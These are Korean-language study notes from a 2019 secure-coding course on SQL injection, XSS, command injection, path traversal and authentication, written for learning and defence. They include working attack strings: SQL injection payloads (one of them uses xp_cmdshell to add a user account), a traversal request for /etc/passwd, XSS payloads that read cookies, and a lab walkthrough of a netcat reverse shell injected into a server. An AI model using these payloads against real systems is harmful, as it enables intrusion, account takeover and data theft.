# 20190722) start 

books)
1. 그림 설명으로 한번에 이해할 수 있는 보안의 기본 - 위즈플래닛
2. 해킹 방어를 위한 JAVA 시큐어코딩 - 오픈이지북스
-----------------------------------------------------------

* SQL injection
외부 입력값을 쿼리 조작 문자열 포함 여부를 검증하지 않고 쿼리 작성 및 실행에 사용하는 경우, 쿼리의 구조와 의미가 변경되서 실행되는 것
    - 데이터베이스에 대해 침해 -> 권한 밖의 데이터를 조회, 수정, 삭제, 생성 가능
    - 서버에 대한 공격 -> 데이터베이스가 동작하는 서버의 제어권을 획득해서 원격지에서 해당 서버를 제어

*XSS 공격 (Cross-Site Scripting or Corss-Site Script)
크로스사이트 스크립트(팅)
공격자가 전달한 스크립트 코드가 사용자 브라우져를 통해서 실행되는 것 (=동적페이지가 생성될 때)
    - 브라우저에 저장된 또는 PC에 저장된 정보를 탈취
    - 가짜 페이지를 만들고 사용자로 하여금 입력을 유도해서 입력값을 탈취
    - 해당 pc의 제어권을 탈취해서 원격에서 제어 -> 좀비화 -> BeEF 프레임웍 이용


    --------------------------------------------------------

* 입력값 검증)
입력값의 정상 여부를 확인하는 과정


예) ID 중복 체크 로직을 구현
1. 입력화면
ID: 123 or 1=1 [체크]

2. 사용자 입력을 요청 파라미터로 서버로 전달
http://.../check.jsp?id=123 or 1=1

3. 요청 파라미터로 전달된 값은 서버 내부 처리를 위해서 사용
select * from users where id = 123 or 1=1


SQL 삽입(Injection), 운영체제 명령어 삽입(Command Injection), 신뢰되지 않은 URL 주소로 자동 접속 연결(Open Redirect)


-----------------------------------------------------------------
인증 (Authentification)
    1) 지식 기반 ( id, pw)
    2) 소유 기반 ( 하드웨어, 카드, usb 등)
    3) 바이오 기반 (지문, 눈, 목소리, 정맥 등)
    4) 다중요소 기반 (1~3 혼합)

인가 ( = 권한, = 접근통제) (Authorization)
    1) 화면상의 인가
    2) 기능상의 인가
    3) 데이터 상의 인가



------------------------------------------------------------
* 개발보안...
* 정보보호 사전점검.... ( 개발중 >> 민간 확대 3년이내?)
    - 자격 진단원...
* 운영/유지 ISMS








# 20190723

* 용어
    - DLP : 데이터 유출 방지 (Data Loss Prevention)
    - DRP : 디지털 권리 관리 (Digital Rights Management)
    
    - SDL : 보안개발프로세스 (Secure Development Lifecycle)

* 파일 업로드의 잘 못된 구현
    1) 파일 크기 종류 제한 x
        크기 문제)
        - 서버 스토리지(디스크) 자원 고갈
        - 서버 연결 자원 고갈
            => 정상 서비스 방해 = Dos 공격
        종류 문제)
        - 서버에서 실행되는 파일 업로드 (SSS 서버사이드스크립트 PHP,ASP,JSP...등)
            => 서버 제어권 탈취
        - 클라이언트에서 실행되는 파일 업로드
            => 악성코드 유포지로 활용될 수 있음
    
    2) 외부 접근가능 한 경로에 저장됨

* 패스워드
    1) 생성 / 변경 규칙
        - 복잡도 : 영문(26), 숫자(10), 특수문자(13) - 8자리 이상 / 2가지 조합은 10자리 이상. 
        - 사전에 등록된 문자열 사용x
        - 규칙성 x
        - 개인정보 연관x
    2) 저장(보관) 규칙
        - 암호화 후 보관 : 해시함수(단방향 유일 함수) 
    3) 관리 정책
        - 변경주기
        - 최근 사용 패스워드 히스토리 관리
        - 최소 사용기간 

## Secure coding 필요성 숙지.
### 취약점 DB 확인
    - CWE : 보안 약점 (Common Weakness Enumeration) / 문제의 원인의 가능성이 있음..
    - CVE : 보안 취약점 (Common Vulnerabilities and Exposures) / 문제로 나타난 것들..
    - SANS TOP 25 
    - OWASP TOP 10 
### Secure coding 가이드
    - CERT
    - 개발보안가이드
### 방법론
    - MS-SDL
    - 7 touch point
    - CLASP


## 주요 취약점
### SQL injection 방어
#### URL 또는 SQL에 사용되는 의미를 가진 특수 문자를 처리해야함.
    SQL : ', #, ;, -
    URL : ?, &, =
    1) 이스케이프 문자를 사용하여 처리
    2) 입력값 검증

### CSRF(크로스사이트 요청위조)
    서버로 전달된 요청을 요청 절차와 주체에 대한 검증을 수행하지 않고 요청을 처리했을 때 발생

### BoF (Buffuer over Flow)
### 경로 조작, 경로 추적
    특정 디렉터리에 존재하는 파일을 내려주는 서비스 ⇒ 파일 다운로드
    .../download.jsp?filename=abc.gif
    ~~~~~~~~~~~~
    new File("/data/upload/" + filename);
    .../download.jsp?filename=../../../../../../etc/passwd ⇐ 경로조작 → 접근할 수 없는 디렉터리와 파일에 접근이 가능


# 20190724
## 실습
### injection
    1) id에 `admin'#` >>  server에서 `where id = 'admin'#' pw = 'xxx'`
                        뒤 구문이 주석처리됨.
    
### DVWA
    취약점을 모아놓은 패키지
    (Welcome to Damn Vulnerable Web App)

### 프록시사용
    paros)
        요청 catch : trap 
    burp suite)
        요청 catch : intercept

## HTTP와 웹 구조 2번책 131페이지

## HTTP 구조적 특징
    1) Stateless = 커넥션리스, 연결유지x
    2) 요청/응답 구조
        -> 알파넷 시절, 정적문서 요청에 대한 프로토콜이 HTTP
        다수의 연결을 유지하면 이용제한이 걸림...
        요청에 대한 정적 문서 전달 후 연결 종료.

## 동적 페이지의 등장
    1) 동적 처리를 위한 어플리케이션 서버... PHP, JSP, ASP 등
    2) 하드웨어의 발달로 처리기능 향상됨
        - 비즈니스 처리 Servlet
    3) 가상화기술.. 컨테이너... docker 등장
    4) 모듈화 프레임웍... Micro Service Architecture.

# 20190725
## 인증과 인가
### 인증 (Authentication)
    인증은, 서버의 자원을 사용하려는 주체의 신원을 식별(Identification)하는 작업.

    인증방식
    Type1 : 지식기반 ; 패스워드, 보안질문, PIN ... 등
    Type2 : 소유기반 ; 메모리카드, 스마트카드, USB ... 등
    Type3 : 바이오기반 ; 지문, 음성, 정맥, 홍채, 서명 ... 등

    두가지 복합 = 2 factor 인증
    두가지 이상 = multi factor 인증 = 다중 인증

### 인가 (Authorization)
    자원접근 권한을 확인 = 접근통제 

    접근통제 기술
    접근제어목록(ACL:Access Control List) 
    https://ko.wikipedia.org/wiki/%EC%A0%91%EA%B7%BC_%EC%A0%9C%EC%96%B4_%EB%AA%A9%EB%A1%9D
        : 사용자 또는 자원 중심의 접근통제 목록을 작성하여 접근 제어시 목록을 비교하여 접근통제.
    접근통제표(ACM:Access Control Matrix) 
        : 자원 중심의 접근통제 표를 작성하여 접근 제어시 표와 비교하여 접근 통제.
    강제적 접근통제(MAC:Mandotory Access Control)
        : 사용자와 자원에 적절한 보안등급(레이블)을 부여하여 접근 제어시 등급을 비교하여 접근 통제
    역할기반 접근통제(RBAC:Role Base Access Control)
        : 사용자에게 역할(Role)을 부여하고 각 역할별로 권한을 부여 접근 통제

### 웹 인증 방식
    세션사용 여부로 나뉨
    1) 세션을 사용하지 않는 HTTP 인증
    : 요청시마다 인증정보를 가지고 가야함 = 노출빈도 높음 = 유출 가능성 높음
        -Bassic Authentication https://flylib.com/books/en/1.2.1.125/1/
        -HTTP Digest Authentication
        -HTTP NTLM Authentication
        -Anonymous Authentication
    
    2) 세션을 사용하는 인증
        -Form Based Authentication

## 보안취약접 제거를 위한 코딩 기법 p189
### 입력값에 대한 확인 절차가 생략되는 경우 다양한 인젝션(삽입) 취약점이 발생할 수 있다.
    - DB 데이터를 조작하는 SQL문에 검증되지 않은 외부 입력값을 사용하는 경우
    - 내부에서 실행되는 명령어나 명령어의 인자(argument)로 검증되지 않은 외부 입력값 사용
    - LDAP 조회를 위한 필터 조립에 검증되지 않은 외부 입력값사용
    - Xpath 쿼리 작성에 검증되지 않은 외부 입력값 사용
    - XQuery 쿼리 작성에 검증되지 않은 외부 입력값 사용
    - SOAP 서비스 요청 메시지 작성에 검증되지 않은 외부 입력값 사용

### 검증 절차
    - 규범화 (Canonicalization)
        : 데이터 손실 없이 입력 데이터를 가장 간단하면서 대등한 형태로 축소하는 과정
    - 정규화 (Normalization)
        : 데이터 손실은 있지만 알려진 가장 간단한 형태로 변환하는 과정
    - 새니타이즈 (Sanitization)
        : 데이터를 받은 서브시스템의 요구사항에 맞게 데이터를 가공하는 과정
    - 검증 (Validation)
        : 입력 데이터가 프로그램의 정당한 프로그램 입력 영역 안에 있는지 확인하는 과정

### 취약점 1) SQL 삽입
    가능한 피해 :
    - DB 정보 열람 및 추가, 수정 삭제
    - 프로시저를 통해 운영체제 명령어 수행
    - 웹 애플리케이션을 조정해 다른 시스템 공격
    - 외부 프로그램 사용
    - 불법 로그인

```java
예시) search.jsp
String ptext = request.getParameter("text");
String query = "select * from data where keyword = '" + ptext + "'";
Statement stmt = connection.createStatement();
stmt.executeQuery(query);
```

    case1) 항상 참이 되는 입력 => 모든 내용이 반환됨 = 권한 밖의 데이터에 대해 접근이 가능함

    정상적인 요청 : search.jsp?text=abcd
        query = select * from data where keyword = 'abcd'
    비정상적인 요청 : search.jsp?text=abcd' or 'a'='a
        quety = select * fromd ata where keyword = 'abcd' or 'a' = 'a'

    case2) 오류를 유발하는 입력
    search.jsp?text=abcd'
        query = select * from data where keyword = 'abcd''
    => 홑따움표의 개수가 일치하지 않아서 오류가 발생 = 오류 메시지에 대한 처리가 불완전하여 시스템 내부 정보가 사용자 화면에 출력될 수 있음

    
# 20190726

    case3) Stored Procedure를 호출하는 입력 => DB 서버 제어권 탈취에 사용
    요청 : search.jsp?text=abcd'; exec xp_cmdshell 'net user hack hack /add'; --

    query = select * from data where keyword = 'abcd'; exec xp_cmdshell 'net user hack hack /add'; --'

    case4) UNION 구문을 이용한 SQL Injection => 공격자가 작성한 쿼리 구문을 통해 (내부 테이블의) 데이터가 유출 

    UNION 구문 참조 : https://zetawiki.com/wiki/SQL_UNION,_UNION_ALL_%EC%97%B0%EC%82%B0%EC%9E%90

    UNION 구문을 사용하기 위한 전제 조건
    컬럼의 개수와 데이터 타입이 동일해야 한다. => 정상 쿼리(우편번호 조회 쿼리) 실행을 통해서 반환되는 컬럼의 개수와 각 컬럼의 데이터 타입을 확인해야 한다.
    공격자가 원하는 정보를 포함하고 있는 테이블과 컬럼의 이름을 알고 있어야 한다. => 외부에서 (또는 검색을 통해서) 확인 가능한 DBMS의 시스템 테이블을 우선적으로 사용해야 한다.

# 20190729
## SQL Injection 방어기법
    1. 정적쿼리를 사용 = 구조화된 쿼리 실행 = 파라미터화된 쿼리 실행 = 입력값에 따라 쿼리문의 구조가 바뀌지 않도록 한다. = PreparedStatement 객체를 이용해서 쿼리를 실행
    
    2. ORM 프레임워크를 사용하는 경우, 외부 입력값을 쿼리맵에 바인딩할때 반드시 #기호를 이용한다.

    3. 입력값을 검증 → 외부 입력값에 쿼리 조작 문자열 포함 여부를 검증 후 쿼리문 생성 및 실행에 사용

    4. 오류 메시지에 시스템 정보가 노출되지 않도록 한다. ⇒ Error-based SQL Injection 공격을 완화

    5. DB 사용자의 권한을 최소로 부여한다. = 해당 어플리케이션에서 사용하는 DB 객체에 대해서만 권한을 부여한다. ⇒ Stored Procedure 또는 UNION-based SQL Injection 공격을 완화

## 운영체제 명령어 삽입(Command Injection)
    운영체제 명령어 실행 부분이 존재하는 경우,
    외부 입력값을 검증, 제한 없이 운영체제 명령어 실행 부분에 운영체제 명령어 또는 명령어의 일부로 사용되는 경우 발생

    **제한 방법**
    1. White List 방식 = 허용 목록
    2. Black List 방식 = 제한 목록

## 운영체제 명령어 삽입 취약점 방어 기법
    1. 운영체제 명령어 실행 부분의 필요성 여부 및 대체 가능 여부를 판정

    2. 사용할 명령어를 미리 정의하고, 정의된 범위 내에서 사용되도록 한다. = 화이트 리스트 방식의 입력값 제한

    3. 추가 명령어 실행에 사용되는 &, |, ; 등의 문자를 입력값 필터링한다.

## Command Injection - 리버스 쉘 예제
    상황
        1. 서버는 80포트로 서비스중
        2. 서버는 방화벽으로 80포트 외의 접근 막는중
        3. 서버의 서비스중 서버system의 특정파일을 불러오는 코드가 있다는 취약점 발견
        4. 방화벽이 외부의 접근에는 엄격하나, 내부에서의 외부로 접속하는 것은 유연하다는 헛점 이용
        5. 공격자의 컴퓨터에서 응답을 받는 서비스를 올린다.
        6. 서버로 서비스에서 command injection을 이용하여 서버가 스스로 공격자의 응답서비스로 접속하게 한다.
        7. 공격자의 서비스를 통해 서버의 command를 탈 취할 수 있다.

``` 
실행 순서) Kali#1=서버 / Kali#2=공격자

1. @Kali#2 운영체제 명령어 삽입 취약점을 이용한 리버스 쉘 실행
#1 (터미널) 8282 포트로 연결대기
root@kali:~# nc -lvp 8282 

2. @kali#2에서 @kali#1의 서비스(브라우저)에서 OS Command Injection 페이지에서 아래 내용을 입력
www.naver.com; nc KALI#2_IP 8282 -e /bin/bash
 (= KALI#2의 8282포트로 연결 후 /bin/bash을 실행하라는 명령임.)

3. (터미널) 쉘 명령어를 실행 → Kali#1에서 실행된 결과가 터미널에 출력
```

# 20190730

## 크로스 사이트 스크립팅(Cross-Site Scripting, XSS)
    공격자가 전달한 스크립트 코드가 사용자 브라우저를 통해서 실행되는 것
    → 사용자 브라우져 또는 사용자 PC의 저장된 정보를 탈취
    → 가짜 페이지를 만들어서 사용자로 하여금 추가 입력을 유도하고, 해당 정보를 탈취
    → 좀비화하여 원격에서 해당 PC를 조정 => 도구 : BeEF

### 유형
``` html
1) Reflective XSS(반사) 
공격자가 전달한 스크립트 코드가 취얀학 웹 서버를 경유해서 사용자 브라우저에 전달되는 방식
= 입력값이 입력값 검증 또는 출력값 검증 없이 다음 화면 출력에 그대로 사용되는 경우에발생

예시1. 안녕! <%=request.getParameter("input")%>

예시2. <%
         out.print("안녕! "+request.getParameter("input"));
       %>

예시1.과 예시2. 의 코드는 같은 결과를 나타냄.

브라우저의 요청 상황)
정상입력 : .../do.jsp?input=홍길동  => 안녕! 홍길동
비정상입력 : .../do.jsp?input=<script>alert(document.cookie)</script> 
            => 안녕! <script>alert(document.cookie)</script>
            = 화면에는 안녕! 출력 후 해당브라우저의 쿠키 값이 알람창으로 출력됨.


예제) 이클립스-> webcontent/reflective.jsp 생성
<%@ page language="java" contentType="text/html; charset=EUC-KR"
    pageEncoding="EUC-KR"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=EUC-KR">
<title>Insert title here</title>
</head>
<body>
	<%
		String userid = request.getParameter("userid");
		if (userid == null || userid.equals("")) {
	%>
			<form>
				<input type="text" name="userid">
				<input type="submit">	
			</form>
	<%
		} else {
			out.print("Hello! " + userid);
		}
	%>
</body>
</html>


해당페이지 접속 후 url 확인. 
John <script> alert(document.cookie) </script> 입력

=> 스크립트가 적용이 된다는 것 확인 후
http://.../reflective.jsp?userid=John+%3Cscript%3E+alert%28document.cookie%29+%3C%2Fscript%3E 
해당 스크립트가 작동하는 링크를 이용 불특정 다수에게 링크에 접속하도록 유도.
```

``` html
2) Stored XSS (저장)
공격자가 작성한 스크립트 코드가 취약한 서버에 저장되어 지속적으로 사용자 브라우저로 내려가서 실행되는 것 ⇒ 게시판

                                          (서버)
(공격자) 게시판 글쓰기        ---------->   글저장
         <script>...</script>             <script>...</script>
                                                   |
                                                   |
(희생자) 게시판 글보기 ----------------------------+  
         <script>...</script>

```

``` js
3) DOM Based XSS
개발자가 작성한 스크립트 코드의 취약점을 이용한 공격 기법
document.write(_____________)
    => write안의 내용을 검증하지 않아, 공격자가 원하는 script가 입력 후 실행되는 경우.

```

## 스크립트 태그 실행 방법
``` html
1. <script>XSS</script>
2. <script src="XXS.js">
3. <img src="" onerror="javascript:alert(XSS)"> : 이벤트 핸들러 ... 다수
.
.
.
매우 많음...
```

## 참고 사이트
    CSP
    https://developer.mozilla.org/ko/docs/Web/HTTP/CSP

    https://content-security-policy.com/browser-test/

    XSS Cheat Sheet
    https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
